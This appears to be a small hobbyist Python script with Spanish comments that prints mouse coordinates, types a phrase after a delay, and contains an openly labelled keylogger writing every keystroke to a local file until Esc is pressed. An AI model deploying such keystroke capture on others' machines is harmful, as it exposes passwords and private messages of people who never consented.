import pyautogui
from pynput import keyboard
def obtener_posicion_mouse():
    try:
        while True:
            x, y = pyautogui.position()
            print(f'Posición del mouse - X: {x}, Y: {y}', end='\r')
    except KeyboardInterrupt:
        print('\n¡Script detenido!'),

# Ruta del archivo donde se guardarán las teclas presionadas
log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Esto maneja las teclas especiales como Shift, Ctrl, etc.
        with open(log_file, "a") as f:
            f.write(f" {key} ")

def on_release(key):
    if key == keyboard.Key.esc:
        # Detener el keylogger cuando se presiona la tecla Esc
        return False

def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

import time
def digitar (frase):
    time.sleep(5)
    pyautogui.write(frase)
